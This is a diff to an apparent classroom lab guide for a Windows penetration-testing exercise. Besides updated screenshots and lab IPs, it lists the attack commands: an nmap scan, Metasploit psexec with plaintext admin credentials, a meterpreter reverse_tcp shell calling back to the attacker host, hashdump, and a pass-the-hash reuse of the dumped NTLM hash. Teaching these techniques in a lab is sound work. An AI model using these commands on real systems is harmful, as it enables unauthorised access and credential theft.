@@ -29,9 +29,9 @@ From the command prompt we need to get the IP address of **your** Windows system
 ipconfig
 ```
 
-<img width="697" height="288" alt="2026-02-23_12-46" src="https://github.com/user-attachments/assets/83c711b6-fa49-4384-8aa5-f429f6724776" />
+<img width="457" height="214" alt="img01" src="https://github.com/user-attachments/assets/0417df7d-3b84-4823-8214-5385063cdca8" />
 
-Please note your IP for **your** system. Mine is **"10.10.86.77"**. 
+Please note your IP for **your** system. Mine is **"10.10.75.191"**. 
 
 **Yours will be different.**
 
@@ -61,7 +61,7 @@ Now, let’s rescan from the **Linux** terminal.
 Run the scan: 
 
 ```bash
-nmap 10.10.86.77
+nmap 10.10.75.191
 ```
 
 >[!IMPORTANT]
@@ -149,7 +149,7 @@ Start Metasploit
 msfconsole -q
 ```
 
-<img width="577" height="91" alt="msfconsolebash" src="https://github.com/user-attachments/assets/7078dce4-0385-40fe-a7a5-6852d28a30bf" />
+<img width="430" height="65" alt="msf_console" src="https://github.com/user-attachments/assets/b432d8c4-b773-480e-8993-892636243e1b" />
 
 
 In another Linux terminal, get your IP address
@@ -158,45 +158,46 @@ In another Linux terminal, get your IP address
 ifconfig
 ```
 
-<img width="716" height="175" alt="Get_IP" src="https://github.com/user-attachments/assets/cc1893c9-3a96-4ddb-a16a-45f0bdad0e10" />
+<img width="513" height="119" alt="linux_ip" src="https://github.com/user-attachments/assets/2fdce39e-bbb2-4592-9d30-cd221241476f" />
 
 
-msf6 > `use exploit/windows/smb/psexec`
+msf > `use exploit/windows/smb/psexec`
 
 
-msf6 exploit(windows/smb/psexec) > `set RHOST <Windows IP>`
+msf exploit(windows/smb/psexec) > `set RHOST <Windows IP>`
 
-msf6 exploit(windows/smb/psexec) > `set LHOST <Linux IP>`
+msf exploit(windows/smb/psexec) > `set LHOST <Linux IP>`
 
-msf6 exploit(windows/smb/psexec) > `set SMBUSER Administrator`
+msf exploit(windows/smb/psexec) > `set SMBUSER Administrator`
 
-msf6 exploit(windows/smb/psexec) > `set SMBPASS password1234`
+msf exploit(windows/smb/psexec) > `set SMBPASS password1234`
 
-msf6 exploit(windows/smb/psexec) > `set payload windows/x64/meterpreter/reverse_tcp`
+msf exploit(windows/smb/psexec) > `set payload windows/x64/meterpreter/reverse_tcp`
 
-msf6 exploit(windows/smb/psexec) > `set target 2`
+msf exploit(windows/smb/psexec) > `set target 2`
 
-msf6 exploit(windows/smb/psexec) > `exploit`
+msf exploit(windows/smb/psexec) > `exploit`
 
 It should look lie this:
 
-<img width="947" height="377" alt="2026-02-23_13-46" src="https://github.com/user-attachments/assets/63165ac9-d530-48f4-bc56-665c17ace0d1" />
-
+<img width="713" height="401" alt="meterpreter_shell_1" src="https://github.com/user-attachments/assets/acecbedb-41e7-44d8-a981-bf93ce408f03" />
 
 Now dump the password hashes:
 
 meterpreter > `hashdump`
 
-<img width="805" height="122" alt="1" src="https://github.com/user-attachments/assets/85a53c8e-5339-40fd-8a3c-316fec8b26bd" />
+<img width="617" height="86" alt="hashdump" src="https://github.com/user-attachments/assets/5b56ec37-fa6d-4172-9347-51d703ccd8f3" />
 
 meterpreter > `exit -y`
 
 
-msf6 exploit(windows/smb/psexec) > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:d4a1be1776ad10df103812b1a923cde4`
+msf exploit(windows/smb/psexec) > `set SMBPASS aad3b435b51404eeaad3b435b51404ee:d4a1be1776ad10df103812b1a923cde4`
 
-msf6 exploit(windows/smb/psexec) > `exploit`
+msf exploit(windows/smb/psexec) > `exploit`
 
-<img width="1030" height="445" alt="2" src="https://github.com/user-attachments/assets/f3801a66-0c9e-4087-b219-180ac2fd8564" />
+<img width="769" height="373" alt="meterpreter_shell_2" src="https://github.com/user-attachments/assets/a0e79b48-f167-4ac6-bfc1-7c5c5cfefaf8" />
+<img width="457" height="214" alt="img01" src="https://github.com/user-attachments/assets/4f2eb6c4-6f81-42ab-849a-4ab7e5e16ab3" />
+<img width="457" height="214" alt="img01" src="https://github.com/user-attachments/assets/071ce116-d7cc-4920-8ae5-ba732781173f" />
 
 Kill it
 
